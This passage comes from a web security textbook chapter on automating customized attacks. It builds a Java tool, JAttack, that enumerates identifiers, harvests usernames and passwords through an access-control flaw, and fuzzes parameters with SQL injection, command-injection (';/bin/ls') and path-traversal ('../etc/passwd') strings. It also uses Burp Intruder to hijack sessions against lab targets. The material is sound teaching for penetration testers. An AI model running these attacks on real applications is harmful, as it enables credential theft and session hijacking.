implement:\ninterface PayloadSource\n{\nboolean nextPayload();\nvoid reset();\nString getPayload();\n}\nThe nextPayload method can be used to advance the state of the source; it\nreturns true until all its payloads are used up. The reset method returns the\nstate to its initial point. The getPayload method returns the value of the cur-\nrent payload.\ncc1144..iinndddd 557788 88//1199//22001111 1122::1155::2211 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 579\nChapter 14 n Automating Customized Attacks 579\nIn the document enumeration example, the parameter we want to vary contains\na numeric value, so our fi rst implementation of the PayloadSource interface is\na class to generate numeric payloads. This class allows us to specify the range\nof numbers we want to test:\nclass PSNumbers implements PayloadSource\n{\nint from, to, step, current;\nPSNumbers(int from, int to, int step)\n{\nthis.from = from;\nthis.to = to;\nthis.step = step;\nreset();\n}\npublic boolean nextPayload()\n{\ncurrent += step;\nreturn current <= to;\n}\npublic void reset()\n{\ncurrent = from - step;\n}\npublic String getPayload()\n{\nreturn Integer.toString(current);\n}\n}\nEquipped with the concept of a request parameter and a payload\nsource, we have suffi cient resources to generate actual requests and process\nthe server’s responses. First, let’s specify some confi guration for our fi rst\nattack:\nclass JAttack\n{\n// attack config\nString host = “mdsec.net”;\nint port = 80;\nString method = “GET”;\nString url = “/app/ShowPage.ashx”;\nParam[] params = new Param[]\n{\nnew Param(“PageNo”, “10069”, Param.Type.URL, true),\n};\nPayloadSource payloads = new PSNumbers(10060, 10080, 1);\ncc1144..iinndddd 557799 88//1199//22001111 1122::1155::2211 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 580\n580 Chapter 14 n Automating Customized Attacks\nThis confi guration includes the basic target information, creates a single\nrequest parameter called PageNo, and confi gures our numeric payload source\nto cycle through the range 10060 to 10080.\nTo cycle through a series of requests, potentially targeting multiple param-\neters, we need to maintain some state. Let’s use a simple nextRequest method to\nadvance the state of our request engine, returning true until no more requests\nremain:\n// attack state\nint currentParam = 0;\nboolean nextRequest()\n{\nif (currentParam >= params.length)\nreturn false;\nif (!params[currentParam].attack)\n{\ncurrentParam++;\nreturn nextRequest();\n}\nif (!payloads.nextPayload())\n{\npayloads.reset();\ncurrentParam++;\nreturn nextRequest();\n}\nreturn true;\n}\nThis stateful request engine keeps track of which parameter we are currently\ntargeting and which attack payload to place into it. The next step is to actually\nbuild a complete HTTP request using this information. This involves inserting\neach type of parameter into the correct place in the request and adding any\nother required headers:\nString buildRequest()\n{\n// build parameters\nStringBuffer urlParams = new StringBuffer();\nStringBuffer cookieParams = new StringBuffer();\nStringBuffer bodyParams = new StringBuffer();\nfor (int i = 0; i < params.length; i++)\n{\nString value = (i == currentParam) ?\npayloads.getPayload() :\nparams[i].value;\ncc1144..iinndddd 558800 88//1199//22001111 1122::1155::2211 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 581\nChapter 14 n Automating Customized Attacks 581\nif (params[i].type == Param.Type.URL)\nurlParams.append(params[i].name + “=” + value + “&”);\nelse if (params[i].type == Param.Type.COOKIE)\ncookieParams.append(params[i].name + “=” + value + “; “);\nelse if (params[i].type == Param.Type.BODY)\nbodyParams.append(params[i].name + “=” + value + “&”);\n}\n// build request\nStringBuffer req = new StringBuffer();\nreq.append(method + “ “ + url);\nif (urlParams.length() > 0)\nreq.append(“?” + urlParams.substring(0, urlParams.length() - 1));\nreq.append(“ HTTP/1.0\\r\\nHost: “ + host);\nif (cookieParams.length() > 0)\nreq.append(“\\r\\nCookie: “ + cookieParams.toString());\nif (bodyParams.length() > 0)\n{\nreq.append(“\\r\\nContent-Type: application/x-www-form-urlencoded”);\nreq.append(“\\r\\nContent-Length: “ + (bodyParams.length() - 1));\nreq.append(“\\r\\n\\r\\n”);\nreq.append(bodyParams.substring(0, bodyParams.length() - 1));\n}\nelse req.append(“\\r\\n\\r\\n”);\nreturn req.toString();\n}\nNOTE If you write your own code to generate POST requests, you need to\ninclude a valid Content-Length header that specifi es the actual length of the\nHTTP body in each request, as in the preceding code. If an invalid Content-\nLength is submitted, most web servers either truncate the data you submit or\nwait indefi nitely for more data to be supplied.\nTo send our requests, we need to open network connections to the target web\nserver. Java makes it easy to open a TCP connection, submit data, and read the\nserver’s response:\nString issueRequest(String req) throws UnknownHostException, IOException\n{\nSocket socket = new Socket(host, port);\nOutputStream os = socket.getOutputStream();\nos.write(req.getBytes());\nos.flush();\nBufferedReader br = new BufferedReader(new InputStreamReader(\nsocket.getInputStream()));\nStringBuffer response = new StringBuffer();\ncc1144..iinndddd 558811 88//1199//22001111 1122::1155::2211 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 582\n582 Chapter 14 n Automating Customized Attacks\nString line;\nwhile (null != (line = br.readLine()))\nresponse.append(line);\nos.close();\nbr.close();\nreturn response.toString();\n}\nHaving obtained the server’s response to each request, we need to parse it to\nextract the relevant information to enable us to identify hits in our attack. Let’s\nstart by simply recording two interesting items — the HTTP status code from\nthe fi rst line of the response and the total length of the response:\nString parseResponse(String response)\n{\nStringBuffer output = new StringBuffer();\noutput.append(response.split(“\\\\s+”, 3)[1] + “\\t”);\noutput.append(Integer.toString(response.length()) + “\\t”);\nreturn output.toString();\n}\nFinally, we now have everything in place to launch our attack. We just need\nsome simple wrapper code to call each of the preceding methods in turn and\nprint the results until all our requests have been made and nextRequest returns\nfalse:\nvoid doAttack()\n{\nSystem.out.println(“param\\tpayload\\tstatus\\tlength”);\nString output = null;\nwhile (nextRequest())\n{\ntry\n{\noutput = parseResponse(issueRequest(buildRequest()));\n}\ncatch (Exception e)\n{\noutput = e.toString();\n}\nSystem.out.println(params[currentParam].name + “\\t” +\npayloads.getPayload() + “\\t” + output);\n}\n}\npublic static void main(String[] args)\ncc1144..iinndddd 558822 88//1199//22001111 1122::1155::2222 PPMM"
  },
  {
    "input": "Harvesting Useful Data",
    "output": "Stuttard c14.indd V3 - 08/11/2011 Page 583\nChapter 14 n Automating Customized Attacks 583\n{\nnew JAttack().doAttack();\n}\nThat’s it! To compile and run this code, you need to download the Java SDK\nand JRE from Sun and then execute the following:\n> javac JAttack.java\n> java JAttack\nIn our sample confi guration, the tool’s output is as follows:\nparam payload status length\nPageNo 10060 500 3154\nPageNo 10061 500 3154\nPageNo 10062 200 1083\nPageNo 10063 200 1080\nPageNo 10064 500 3154\n...\nAssuming a normal network connection and amount of processing power,\nJAttack can issue hundreds of individual requests per minute and output the\npertinent details. This lets you quickly fi nd valid document identifi ers for fur-\nther investigation.\nTRY IT!\nhttp://mdsec.net/app/\nIt may appear that the attack just illustrated is no more sophisticated than the\noriginal bash script example, which required only a few lines of code. However,\nbecause of how JAttack is engineered, it is easy to modify it to deliver much\nmore sophisticated attacks, incorporating multiple request parameters, a vari-\nety of payload sources, and arbitrarily complex processing of responses. In the\nfollowing sections, we will make some minor additions to JAttack’s code that\nwill make it considerably more powerful.\nHarvesting Useful Data\nThe second main use of customized automation when attacking an application\nis to extract useful or sensitive data by using specifi c crafted requests to retrieve\nthe information one item at a time. This situation most commonly arises when\nyou have identifi ed an exploitable vulnerability, such as an access control fl aw,\nthat enables you to access an unauthorized resource by specifying an identifi er\nfor it. However, it may also arise when the application is functioning entirely as\ncc1144..iinndddd 558833 88//1199//22001111 1122::1155::2222 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 584\n584 Chapter 14 n Automating Customized Attacks\nintended by its designers. Here are some examples of cases where automated\ndata harvesting may be useful:\nn An online retailing application contains a facility for registered customers\nto view their pending orders. However, if you can determine the order\nnumbers assigned to other customers, you can view their order informa-\ntion in the same way as your own.\nn A forgotten password function relies on a user-confi gurable challenge.\nYou can submit an arbitrary username and view the associated challenge.\nBy iterating through a list of enumerated or guessed usernames, you can\nobtain a large list of users’ password challenges to identify those that are\neasily guessable.\nn A work fl ow application contains a function to display some basic account\ninformation about a given user, including her privilege level within the\napplication. By iterating through the range of user IDs in use, you can\nobtain a listing of all administrative users, which can be used as the basis\nfor password guessing and other attacks.\nThe basic approach to using automation to harvest data is essentially similar\nto the enumeration of valid identifi ers, except that you are now not only inter-\nested in a binary result (a hit or a miss) but also are seeking to extract some of\nthe content of each response in a usable form.\nConsider the following request, which is made by a logged-in user to show\nhis account information:\nGET /auth/498/YourDetails.ashx?uid=198 HTTP/1.1\nHost: mdsec.net\nCookie: SessionId=0947F6DC9A66D29F15362D031B337797\nAlthough this application function is accessible only by authenticated users,\nan access control vulnerability exists, which means that any user can view the\ndetails of any other user by simply modifying the uid parameter. In a further\nvulnerability, the details disclosed also include the user’s full credentials. Given\nthe low value of the uid parameter for our user, it should be easy to predict\nother users’ identifi ers.\nWhen a user’s details are displayed, the page source contains the personal\ndata within an HTML table like the following:\n<tr>\n<td>Name: </td><td>Phill Bellend</td>\n</tr>\n<tr>\n<td>Username: </td><td>phillb</td>\n</tr>\ncc1144..iinndddd 558844 88//1199//22001111 1122::1155::2222 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 585\nChapter 14 n Automating Customized Attacks 585\n<tr>\n<td>Password: </td><td>b3ll3nd</td>\n</tr>\n...\nGiven the application’s behavior, it is straightforward to mount a customized\nautomated attack to harvest all the user information, including credentials, held\nwithin the application.\nTo do so, let’s make some quick enhancements to the JAttack tool to enable\nit to extract and log specifi c data from within the server’s responses. First, we\ncan add to the attack confi guration data a list of the strings within the source\ncode that identify the interesting content we want to extract:\nstatic final String[] extractStrings = new String[]\n{\n“<td>Name: </td><td>”,\n“<td>Username: </td><td>”,\n“<td>Password: </td><td>”\n};\nSecond, we can add the following to the parseResponse method to search\neach response for each of these strings and extract what comes next, up until\nthe angle bracket that follows it:\nfor (String extract : extractStrings)\n{\nint from = response.indexOf(extract);\nif (from == -1)\ncontinue;\nfrom += extract.length();\nint to = response.indexOf(“<”, from);\nif (to == -1)\nto = response.length();\noutput.append(response.subSequence(from, to) + “\\t”);\n}\nThat is all we need to change within the tool’s actual code. To confi gure JAttack\nto target the actual request in which we are interested, we need to update its\nattack confi guration as follows:\nString url = “/auth/498/YourDetails.ashx”;\nParam[] params = new Param[]\n{\nnew Param(“SessionId”, “0947F6DC9A66D29F15362D031B337797”,\nParam.Type.COOKIE, false),\nnew Param(“uid”, “198”, Param.Type.URL, true),\n};\nPayloadSource payloads = new PSNumbers(190, 200, 1);\ncc1144..iinndddd 558855 88//1199//22001111 1122::1155::2222 PPMM"
  },
  {
    "input": "Fuzzing for Common Vulnerabilities",
    "output": "Stuttard c14.indd V3 - 08/11/2011 Page 586\n586 Chapter 14 n Automating Customized Attacks\nThis confi guration instructs JAttack to make requests to the relevant URL\ncontaining the two required parameters: the cookie containing our current ses-\nsion token, and the vulnerable user identifi er. Only one of these will actually\nbe modifi ed, using the range of potential uid numbers specifi ed.\nWhen we now run JAttack, we obtain the following output:\nuid 190 500 300\nuid 191 200 27489 Adam Matthews sixpack b4dl1ght\nuid 192 200 28991 Pablina S pablo puntita5th\nuid 193 200 29430 Shawn fattysh gr3ggslu7\nuid 194 500 300\nuid 195 200 28224 Ruth House ruth_h lonelypu55\nuid 196 500 300\nuid 197 200 28171 Chardonnay vegasc dangermou5e\nuid 198 200 27880 Phill Bellend phillb b3ll3nd\nuid 199 200 28901 Paul Byrne byrnsey l33tfuzz\nuid 200 200 27388 Peter Weiner weiner skinth1rd\nAs you can see, the attack was successful and captured the details of some\nusers. By widening the numeric range used in the attack, we could extract the\nlogin information of every user in the application, hopefully including some\napplication administrators.\nTRY IT!\nhttp://mdsec.net/auth/498/\nNote that if you are running the sample JAttack code against this lab example,\nyou need to adjust the URL, session cookie, and user ID parameter used\nin your attack confi guration, according to the values you are issued by the\napplication.\nTIP Data output in tab-delimited format can be easily loaded into spread-\nsheet software such as Excel for further manipulation or tidying up. In many\nsituations, the output from a data-harvesting exercise can be used as the\ninput for another automated attack.\nFuzzing for Common Vulnerabilities\nThe third main use of customized automation does not involve targeting any\nknown vulnerability to enumerate or extract information. Rather, your objective\nis to probe the application with various crafted attack strings designed to cause\nanomalous behavior within the application if particular common vulnerabilities\ncc1144..iinndddd 558866 88//1199//22001111 1122::1155::2222 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 587\nChapter 14 n Automating Customized Attacks 587\nare present. This type of attack is much less focused than the ones previously\ndescribed, for the following reasons:\nn It generally involves submitting the same set of attack payloads as every\nparameter to every page of the application, regardless of the normal\nfunction of each parameter or the type of data the application expects to\nreceive. These payloads are sometimes called fuzzstrings.\nn You do not know in advance precisely how to identify hits. Rather than\nmonitoring the application’s responses for a specifi c indicator of success,\nyou generally need to capture as much detail as possible in a clear form.\nThen you can easily review this information to identify cases where your\nattack string has triggered some anomalous behavior within the applica-\ntion that merits further investigation.\nAs you have seen when examining various common web application fl aws,\nsome vulnerabilities manifest themselves in the application’s behavior in\nparticular recognizable ways, such as a specifi c error message or HTTP status\ncodes. These vulnerability signatures can sometimes be relied on to detect\ncommon defects, and they are the means by which automated application\nvulnerability scanners identify the majority of their fi ndings (see Chapter 20).\nHowever, in principle, any test string you submit to the application may give\nrise to any expected behavior that, in its particular context, points toward the\npresence of a vulnerability. For this reason, an experienced attacker using\ncustomized automated techniques is usually much more effective than any\nfully automated tool can ever be. Such an attacker can perform an intelligent\nanalysis of every pertinent detail of the application’s responses. He can think\nlike an application designer and developer. And he can spot and investigate\nunusual connections between requests and responses in a way that no cur-\nrent tool can.\nUsing automation to facilitate vulnerability discovery is of particular benefi t\nin a large and complex application containing dozens of dynamic pages, each\nof which accepts numerous parameters. Testing every request manually, and\ntracking the pertinent details of the application’s responses to related requests,\nis nearly impossible. The only practical way to probe such an application is to\nleverage automation to replicate many of the laborious tasks that you would\notherwise need to perform manually.\nHaving identifi ed and exploited the broken access controls in the preceding\nexample, we could also perform a fuzzing attack to check for various input-\nbased vulnerabilities. As an initial exploration of the attack surface, we decide\nto submit the following strings in turn within each parameter:\nn ‘ — This generates an error in some instances of SQL injection.\nn ;/bin/ls — This string causes unexpected behavior in some cases of\ncommand injection.\ncc1144..iinndddd 558877 88//1199//22001111 1122::1155::2222 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 588\n588 Chapter 14 n Automating Customized Attacks\nn ../../../../../etc/passwd — This string causes a different response\nin some cases where a path traversal fl aw exists.\nn xsstest — If this string is copied into the server’s response, the applica-\ntion may be vulnerable to cross-site scripting.\nWe can extend the JAttack tool to generate these payloads by creating a new\npayload source:\nclass PSFuzzStrings implements PayloadSource\n{\nstatic final String[] fuzzStrings = new String[]\n{\n“’”, “;/bin/ls”, “../../../../../etc/passwd”, “xsstest”\n};\nint current = -1;\npublic boolean nextPayload()\n{\ncurrent++;\nreturn current < fuzzStrings.length;\n}\npublic void reset()\n{\ncurrent = -1;\n}\npublic String getPayload()\n{\nreturn fuzzStrings[current];\n}\n}\nNOTE Any serious attack to probe the application for security fl aws would\nneed to employ many other attack strings to identify other weaknesses and\nother variations on the defects previously mentioned. See Chapter 21 for a\nmore comprehensive list of the strings that are effective when fuzzing a web\napplication.\nTo use JAttack for fuzzing, we also need to extend its response analysis code\nto provide more information about each response received from the applica-\ntion. A simple way to greatly enhance this analysis is to search each response\nfor a number of common strings and error messages that may indicate that\nsome anomalous behavior has occurred, and record any appearance within\nthe tool’s output.\ncc1144..iinndddd 558888 88//1199//22001111 1122::1155::2222 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 589\nChapter 14 n Automating Customized Attacks 589\nFirst, we can add to the attack confi guration data a list of the strings we want\nto search for:\nstatic final String[] grepStrings = new String[]\n{\n“error”, “exception”, “illegal”, “quotation”, “not found”, “xsstest”\n};\nSecond, we can add the following to the parseResponse method to search\neach response for the preceding strings and log any that are found:\nfor (String grep : grepStrings)\nif (response.indexOf(grep) != -1)\noutput.append(grep + “\\t”);\nTIP Incorporating this search functionality into JAttack frequently proves\nuseful when enumerating identifi ers within the application. It is common to\nfi nd that the most reliable indicator of a hit is the presence or absence of a\nspecifi c expression within the application’s response.\nThis is all we need to do to create a basic web application fuzzer. To deliver\nthe actual attack, we simply need to update our JAttack confi guration to attack\nboth parameters to the request and use our fuzz strings as payloads:\nString host = “mdsec.net”;\nint port = 80;\nString method = “GET”;\nString url = “/auth/498/YourDetails.ashx”;\nParam[] params = new Param[]\n{\nnew Param(“SessionId”, “C1F5AFDD7DF969BD1CD2CE40A2E07D19”,\nParam.Type.COOKIE, true),\nnew Param(“uid”, “198”, Param.Type.URL, true),\n};\nPayloadSource payloads = new PSFuzzStrings();\nWith this confi guration in place, we can launch our attack. Within a few sec-\nonds, JAttack has submitted each attack payload within each parameter of the\nrequest, which would have taken several minutes at least to issue manually. It also\nwould have taken far longer to review and analyze the raw responses received.\nThe next task is to manually inspect the output from JAttack and attempt to\nidentify any anomalous results that may indicate the presence of a vulnerability:\nparam payload status length\nSessionId ‘ 302 502\nSessionId ;/bin/ls 302 502\ncc1144..iinndddd 558899 88//1199//22001111 1122::1155::2222 PPMM"
  },
  {
    "input": "Putting It All Together: Burp Intruder",
    "output": "Stuttard c14.indd V3 - 08/11/2011 Page 590\n590 Chapter 14 n Automating Customized Attacks\nSessionId ../../../../../../etc/passwd 302 502\nSessionId xsstest 302 502\nuid ‘ 200 2941 exception quotation\nuid ;/bin/ls 200 2895 exception\nuid ../../../../../../etc/passwd 200 2915 exception\nuid xsstest 200 2898 exception xsstest\nIn requests that modify the SessionId parameter, the application responds\nwith a redirection response that always has the same length. This behavior does\nnot indicate any vulnerability. This is unsurprising, since modifying the ses-\nsion token while logged in typically invalidates the current session and causes\na redirection to the login.\nThe uid parameter is more interesting. All the modifi cations to this parameter\ncause a response containing the string exception. The responses are variable\nin length, indicating that the different payloads result in different responses, so\nthis is probably not just a generic error message. Going further, we can see that\nwhen a single quotation mark is submitted, the application’s response contains\nthe string quotation, which is likely to be part of a SQL error message. This\ncould be a SQL injection fl aw, and we should manually investigate to confi rm\nthis (see Chapter 9). In addition, we can see that the payload xsstest is being\nechoed in the application’s response. We should probe this behavior further to\ndetermine whether the error message can be leveraged to perform a cross-site\nscripting attack (see Chapter 12).\nTRY IT!\nhttp://mdsec.net/auth/498/\nPutting It All Together: Burp Intruder\nThe JAttack tool consists of fewer than 250 lines of simple code, yet in a few\nseconds, it uncovered at least two potentially serious security vulnerabilities\nwhile fuzzing a single request to an application.\nNevertheless, despite its power, as soon as you start to use a tool such as\nJAttack to deliver automated customized attacks, you will quickly identify\nadditional functionality that would make it even more helpful. As it stands, you\nneed to confi gure every targeted request within the tool’s source code and then\nrecompile it. It would be better to read this information from a confi guration\nfi le and dynamically construct the attack at runtime. In fact, it would be much\ncc1144..iinndddd 559900 88//1199//22001111 1122::1155::2222 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 591\nChapter 14 n Automating Customized Attacks 591\nbetter to have a nice user interface that lets you confi gure each of the attacks\ndescribed in a few seconds.\nThere are many situations in which you need more fl exibility in how payloads\nare generated, requiring many more advanced payload sources than the ones\nwe have created. You will also often need support for SSL, HTTP authentica-\ntion, multithreaded requests, automatic following of redirections, and automatic\nencoding of unusual characters within payloads. There are situations in which\nmodifying a single parameter at a time would be too restrictive. You will want\nto inject one payload source into one parameter and a different source into\nanother. It would be good to store all the application’s responses for easy refer-\nence so that you can immediately inspect an interesting response to understand\nwhat is happening, and even tinker with the corresponding request manually\nand reissue it. As well as modifying and issuing a single request repeatedly, in\nsome situations you need to handle multistage processes, application sessions,\nand per-request tokens. It would also be nice to integrate the tool with other\nuseful tools such as a proxy and a spider, avoiding the need to cut and paste\ninformation back and forth.\nBurp Intruder is a unique tool that implements all this functionality. It is\ndesigned specifi cally to enable you to perform all kinds of customized auto-\nmated attacks with a minimum of confi guration and to present the results\nin a rich amount of detail, enabling you to quickly hone in on hits and other\nanomalous test cases. It is also fully integrated with the other Burp Suite\ntools. For example, you can trap a request in the proxy, pass this to Intruder\nto be fuzzed, and pass interesting results to Repeater to confi rm and exploit\nall kinds of vulnerabilities.\nWe will describe the basic functions and confi guration of Burp Intruder and\nthen look at some examples of its use in performing customized automated\nattacks.\nPositioning Payloads\nBurp Intruder uses a conceptual model similar to the one JAttack uses, based\non positioning payloads at specifi c points within a request, and one or more\npayload sources. However, Intruder is not restricted to inserting payload strings\ninto the values of the actual request parameters. Payloads can be positioned at\na subpart of a parameter’s value, or at a parameter’s name, or indeed anywhere\nat all within a request’s headers or body.\nHaving identifi ed a particular request to use as the basis for the attack, each\npayload position is defi ned using a pair of markers to indicate the start and end\nof the payload’s insertion point, as shown in Figure 14-1.\ncc1144..iinndddd 559911 88//1199//22001111 1122::1155::2222 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 592\n592 Chapter 14 n Automating Customized Attacks\nFigure 14-1: Positioning payloads\nWhen a payload is inserted at a particular position, any text between the\nmarkers is overwritten with the payload. When a payload is not being inserted,\nthe text between the markers is submitted instead. This is necessary in order to\ntest one parameter at a time, leaving others unmodifi ed, as when performing\napplication fuzzing. Clicking the Auto button makes Intruder set payload posi-\ntions at the values of all URL, cookie, and body parameters, thereby automating\na tedious task that was done manually in JAttack.\nThe sniper attack type is the one you will need most frequently. It functions\nin the same way as JAttack’s request engine, targeting one payload position at\na time, submitting all payloads at that position, and then moving to the next\nposition. Other attack types enable you to target multiple positions simultane-\nously in different ways, using multiple payload sets.\nChoosing Payloads\nThe next step in preparing an attack is to choose the set of payloads to be\ninserted at the defi ned positions. Intruder contains numerous built-in functions\nfor generating attack payloads, including the following:\ncc1144..iinndddd 559922 88//1199//22001111 1122::1155::2222 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 593\nChapter 14 n Automating Customized Attacks 593\nn Lists of preset and confi gurable items.\nn Custom iteration of payloads based on any syntactic scheme. For example,\nif the application uses usernames of the form ABC45D, the custom iterator\ncan be used to cycle through the range of all possible usernames.\nn Character and case substitution. From a starting list of payloads, Intruder\ncan modify individual characters and their case to generate variations.\nThis can be useful when brute-forcing passwords. For example, the string\npassword can be modifi ed to become p4ssword, passw0rd, Password,\nPASSWORD, and so on.\nn Numbers, which can be used to cycle through document IDs, session\ntokens, and so on. Numbers can be created in decimal or hexadecimal, as\nintegers or fractions, sequentially, in stepped increments, or randomly.\nProducing random numbers within a defi ned range can be useful when\nsearching for hits when you have an idea of how large some valid values\nare but have not identifi ed any reliable pattern for extrapolating these.\nn Dates, which can be used in the same way as numbers in some situations.\nFor example, if a login form requires a date of birth to be entered, this func-\ntion can be used to brute-force all the valid dates within a specifi ed range.\nn Illegal Unicode encodings, which can be used to bypass some input fi lters\nby submitting alternative encodings of malicious characters.\nn Character blocks, which can be used to probe for buffer overfl ow vulner-\nabilities (see Chapter 16).\nn A brute-forcer function, which can be used to generate all the permuta-\ntions of a particular character set in a specifi c range of lengths. Using this\nfunction is a last resort in most situations because of the huge number\nof requests it generates. For example, brute-forcing all possible six-digit\npasswords containing only lowercase alphabetical characters produces\nmore than three million permutations — more than can practically be\ntested with only remote access to the application.\nn “Character frobber” and “bit fl ipper” functions, which can be used to\nsystematically manipulate parts of a parameter’s existing value to probe\nthe application’s handling of subtle modifi cations (see Chapter 7).\nIn addition to the payload generation functions, you can confi gure rules to\nperform arbitrary processing on each payload’s value before it is used. This\nincludes string and case manipulation, encoding and decoding in various\nschemes, and hashing. Doing so enables you to build effective payloads in many\nkinds of unusual situations.\ncc1144..iinndddd 559933 88//1199//22001111 1122::1155::2233 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 594\n594 Chapter 14 n Automating Customized Attacks\nBurp Intruder by default URL-encodes any characters that might invalidate\nyour request if placed into the request in their literal form.\nConfi guring Response Analysis\nFor many kinds of attacks, you should identify the attributes of the server’s\nresponses that you are interested in analyzing. For example, when enumerating\nidentifi ers, you may need to search each response for a specifi c string. When\nfuzzing, you may want to scan for a large number of common error messages\nand the like.\nBy default, Burp Intruder records in its table of results the HTTP status code,\nthe response length, any cookies set by the server, and the time taken to receive\nthe response. As with JAttack, you can additionally confi gure Burp Intruder to\nperform some custom analysis of the application’s responses to help identify\ninteresting cases that may indicate the presence of a vulnerability or merit fur-\nther investigation. You can specify strings or regex expressions that responses\nwill be searched for. You can set customized strings to control extraction of data\nfrom the server’s responses. And you can make Intruder check whether each\nresponse contains the attack payload itself to help identify cross-site scripting\nand other response injection vulnerabilities. These settings can be confi gured\nbefore each attack is launched and can also be applied to the attack results after\nthe attack has started.\nHaving confi gured payload positions, payload sources, and any required\nanalysis of server responses, you are ready to launch your attack. Let’s take a\nquick look at how Intruder can be used to deliver some common customized\nautomated attacks.\nAttack 1: Enumerating Identifi ers\nSuppose that you are targeting an application that supports self-registration for\nanonymous users. You create an account, log in, and gain access to a minimum\nof functionality. At this stage, one area of obvious interest is the application’s\nsession tokens. Logging in several times in close succession generates the fol-\nlowing sequence:\n000000-fb2200-16cb12-172ba72551\n000000-bc7192-16cb12-172ba7279e\n000000-73091f-16cb12-172ba729e8\n000000-918cb1-16cb12-172ba72a2a\n000000-aa820f-16cb12-172ba72b58\n000000-bc8710-16cb12-172ba72e2b\ncc1144..iinndddd 559944 88//1199//22001111 1122::1155::2233 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 595\nChapter 14 n Automating Customized Attacks 595\nYou follow the steps described in Chapter 7 to analyze these tokens. It is evident\nthat approximately half of the token is not changing, but you also discover that\nthe second portion of the token is not actually processed by the application either.\nModifying this portion entirely does not invalidate your tokens. Furthermore,\nalthough it is not trivially sequential, the fi nal portion clearly appears to be\nincrementing in some fashion. This looks like a promising opportunity for a\nsession hijacking attack.\nTo leverage automation to deliver this attack, you need to fi nd a single request/\nresponse pair that can be used to detect valid tokens. Typically, any request for\nan authenticated page of the application will serve this purpose. You decide to\ntarget the page presented to each user following login:\nGET /auth/502/Home.ashx HTTP/1.1\nHost: mdsec.net\nCookie: SessionID=000000-fb2200-16cb12-172ba72551\nBecause of what you know about the structure and handling of session tokens,\nyour attack needs to modify only the fi nal portion of the token. In fact, because\nof the sequence identifi ed, the most productive initial attack modifi es only the\nlast few digits of the token. Accordingly, you confi gure Intruder with a single\npayload position, as shown in Figure 14-2.\nFigure 14-2: Setting a custom payload position\ncc1144..iinndddd 559955 88//1199//22001111 1122::1155::2233 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 596\n596 Chapter 14 n Automating Customized Attacks\nYour payloads need to sequence through all possible values for the fi nal three\ndigits. The token appears to use the same character set as hexadecimal numbers:\n0 to 9 and a to f. So you confi gure a payload source to generate all hexadecimal\nnumbers in the range 0x000 to 0xfff, as shown in Figure 14-3.\nFigure 14-3: Configuring numeric payloads\nIn attacks to enumerate valid session tokens, identifying hits is typically\nstraightforward. In the present case you have determined that the application\nreturns an HTTP 200 response when a valid token is supplied and an HTTP 302\nredirect to the login page when an invalid token is supplied. Hence, you don’t\nneed to confi gure any custom response analysis for this attack.\nLaunching the attack causes Intruder to quickly iterate through the requests.\nThe attack results are displayed in the form of a table. You can click each\ncolumn heading to sort the results according to the contents of that column.\nSorting by status code enables you to easily identify the valid tokens you have\ndiscovered, as shown in Figure 14-4. You can also use the fi ltering and search\nfunctions within the results window to help locate interesting items within\na large set of results.\ncc1144..iinndddd 559966 88//1199//22001111 1122::1155::2233 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 597\nChapter 14 n Automating Customized Attacks 597\nFigure 14-4: Sorting attack results to quickly identify hits\nThe attack is successful. You can take any of the payloads that caused HTTP\n200 responses, replace the last three digits of your session token with this, and\nthereby hijack the sessions of other application users. However, take a closer look\nat the table of results. Most of the HTTP 200 responses have roughly the same\nresponse length, because the home page presented to different users is more or\nless the same. However, two of the responses are much longer, indicating that\na different home page was returned.\nYou can double-click a result item in Intruder to display the server’s response\nin full, either as raw HTTP or rendered as HTML. Doing this reveals that the\nlonger home pages contain more menu options and different details than your\nhome page does. It appears that these two hijacked sessions belong to more-\nprivileged users.\nTRY IT!\nhttp://mdsec.net/auth/502/\ncc1144..iinndddd 559977 88//1199//22001111 1122::1155::2233 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 598\n598 Chapter 14 n Automating Customized Attacks\nTIP The response length frequently is a strong indicator of anomalous\nresponses that merit further investigation. As in the preceding case, a dif-\nferent response length can point to interesting differences that you may not\nhave anticipated when you devised the attack. Therefore, even if another\nattribute provides a reliable indicator of hits, such as the HTTP status code,\nyou should always inspect the response length column to identify other\ninteresting responses.\nAttack 2: Harvesting Information\nBrowsing further into the authenticated area of the application, you notice that\nit uses an index number in a URL parameter to identify functions requested\nby the user. For example, the following URL is used to display the My Details\npage for the current user:\nhttps://mdsec.net/auth/502/ShowPage.ashx?pageid=32010039\nThis behavior offers a prime opportunity to trawl for functionality you have\nnot yet discovered and for which you may not be properly authorized. To do\nthis, you can use Burp Intruder to cycle through a range of possible pageid\nvalues and extract the title of each page that is found.\nIn this situation, it is often sensible to begin trawling for content within a\nnumeric range that is known to contain valid values. To do this, you can set\nyour payload position markers to target the fi nal two digits of the pageid, as\nshown in Figure 14-5, and generate payloads in the range 00 to 99.\nYou can confi gure Intruder to capture the page title from each response\nusing the Extract Grep function. This works much like the extract function of\nJAttack — you specify the expression that precedes the item you want to extract,\nas shown in Figure 14-6.\nLaunching this attack quickly iterates through all the possible values for\nthe last two digits of the pageid parameter and shows the page title from each\nresponse, as shown in Figure 14-7. As you can see, several responses appear\nto contain interesting administrative functionality. Furthermore, some of the\nresponses are redirections to a different URL, which warrant further investi-\ngation. If you want to, you can reconfi gure your Intruder attack to extract the\ntarget of these directions, or even to automatically follow them and show the\npage title from the eventual response.\nTRY IT!\nhttp://mdsec.net/auth/502/\ncc1144..iinndddd 559988 88//1199//22001111 1122::1155::2233 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 599\nChapter 14 n Automating Customized Attacks 599\nFigure 14-5: Positioning the payload\nFigure 14-6: Configuring Extract Grep\ncc1144..iinndddd 559999 88//1199//22001111 1122::1155::2233 PPMM\nStuttard c14.indd V3 - 08/11/2011 